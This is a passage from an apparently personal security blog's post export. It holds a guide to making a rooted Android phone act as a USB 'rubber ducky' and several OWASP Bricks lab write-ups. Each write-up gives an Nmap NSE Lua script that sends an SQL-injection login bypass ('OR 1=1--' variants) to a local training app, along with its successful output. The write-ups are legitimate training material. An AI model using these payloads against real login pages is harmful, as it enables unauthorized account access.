[{"content":"Prerequisite a physical android devices rooted termux app As mentioned, the android devices must be rooted in order to work like a rubber ducky. I\u0026rsquo;ll be using my old devices that I have rooted as demonstration purposes.\nHere\u0026rsquo;s a quick evidence that my devices is rooted.\nSetting up Now that the android devices is rooted, I\u0026rsquo;ll need to download some useful files and application that has been created by others\nandroid usb gadget hid-gadget-test poc_pc_gadget Install the android usb gadget and prepare both the hid-gadget-test and poc_pc_gadget in your devices. After everything is ready, open the android usb gadget application.\nIt should have a popup where it ask about superuser rights. After that, scroll down and use the second option or add another one if there\u0026rsquo;s no second option. In the second option, add keyboard will do.\nAfter adding it, remember to turn on by pressing the \u0026ldquo;Gadget status\u0026rdquo; and process to android terminal (termux).\nMake sure to place the both the file in a same directory and both the file has execute permission.\nBasically, hid-gadget-test is a binary and poc_pc_gadget is a script.\nOne last thing is to take note is the /dev/hidg1. In some cases, the hidg number will be different make sure to have a look. Somehow, I\u0026rsquo;ll need to give all permission to everyone in order to make this works. /dev/hidg1 will only appear if you have turn on the \u0026ldquo;Gadget status\u0026rdquo;.\nSince it does not have execute permission by default, I\u0026rsquo;ll need to change the permission myself.\nAfter everything is done, I could just run the poc_pc_gadget to perform HID attack. remember to give it some try and error\nPOC Here\u0026rsquo;s a demonstration on how it works.\nReferences android usb gadget hid-gadget-test poc_pc_gadget youtube video ","permalink":"https://callmeks.github.io/posts/android-as-rubber-ducky/","summary":"\u003ch2 id=\"prerequisite\"\u003ePrerequisite\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003ea physical android devices\n\u003cul\u003e\n\u003cli\u003erooted\u003c/li\u003e\n\u003cli\u003etermux app\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAs mentioned, the android devices must be rooted in order to work like a rubber ducky. I\u0026rsquo;ll be using my old devices that I have rooted as demonstration purposes.\u003c/p\u003e\n\u003cp\u003eHere\u0026rsquo;s a quick evidence that my devices is rooted.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"alt text\" loading=\"lazy\" src=\"/posts/android-as-rubber-ducky/img/index.png#center\"\u003e\u003c/p\u003e\n\u003ch2 id=\"setting-up\"\u003eSetting up\u003c/h2\u003e\n\u003cp\u003eNow that the android devices is rooted, I\u0026rsquo;ll need to download some useful files and application that has been created by others\u003c/p\u003e","title":"Android as Rubber Ducky"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 5 is just a simple SQL injection which will convert password into md5 hash. We could easily overcome it by injecting in username field.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-5/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall5.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:51 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00015s latency). PORT STATE SERVICE 80/tcp open http | chall1: | result: Succesfully logged in. | SQLQuery: : SELECT * FROM users WHERE name=\u0026#39;a\u0026#39; OR 1=1-- a\u0026#39; and password=\u0026#39;098f6bcd4621d373cade4e832627b4f6\u0026#39; | payload: | submit: Submit | username: a\u0026#39; OR 1=1-- a |_ passwd: test Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-5/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 5 is just a simple SQL injection which will convert password into md5 hash. We could easily overcome it by injecting in username field.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-18\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-18\"\u003e18\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-19\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-19\"\u003e19\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e http \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e shortport \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shortport\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eportrule \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e shortport.http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaction \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e(host,port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e resp,final,query\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;passwd\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Submit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  resp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e http.post(host,port,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/login-5/index.php\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,r)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  final \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e {payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r ,SQLQuery \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e query , result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e final}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThis code is built based on \u003ccode\u003ehttp-title.nse\u003c/code\u003e.\u003c/p\u003e","title":"Bricks Login 5"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 4 is just a SQL injection with bracket and uses double quote. Here\u0026rsquo;s an example: SQL Query: SELECT * FROM users WHERE name=(\u0026quot;a\u0026quot;) and password=(\u0026quot;a\u0026quot;). We could just modify previous NSE script by changing the query.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\\\u0026#34;) OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-4/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall4.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:48 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00011s latency). PORT STATE SERVICE 80/tcp open http | chall1: | SQLQuery: : SELECT * FROM users WHERE name=(\u0026#34;a\u0026#34;) OR 1=1-- a\u0026#34;) and password=(\u0026#34;test\u0026#34;) | payload: | passwd: test | username: a\u0026#34;) OR 1=1-- a | submit: Submit |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-4/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 4 is just a SQL injection with bracket and uses double quote. Here\u0026rsquo;s an example: \u003ccode\u003eSQL Query: SELECT * FROM users WHERE name=(\u0026quot;a\u0026quot;) and password=(\u0026quot;a\u0026quot;)\u003c/code\u003e. We could just modify previous NSE script by changing the query.\u003c/p\u003e","title":"Bricks Login 4"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 3 is just a slightly harder SQL injection as it add brackets. Here\u0026rsquo;s an example: SQL Query: SELECT * FROM users WHERE name=('1') and password=('1') LIMIT 0,1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39;) OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-3/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall3.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 20:40 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00014s latency). PORT STATE SERVICE 80/tcp open http | chall1: | payload: | username: a\u0026#39;) OR 1=1-- a | submit: Submit | passwd: test | SQLQuery: : SELECT * FROM users WHERE name=(\u0026#39;a\u0026#39;) OR 1=1-- a\u0026#39;) and password=(\u0026#39;test\u0026#39;) LIMIT 0,1 |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-3/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 3 is just a slightly harder SQL injection as it add brackets. Here\u0026rsquo;s an example: \u003ccode\u003eSQL Query: SELECT * FROM users WHERE name=('1') and password=('1') LIMIT 0,1\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" 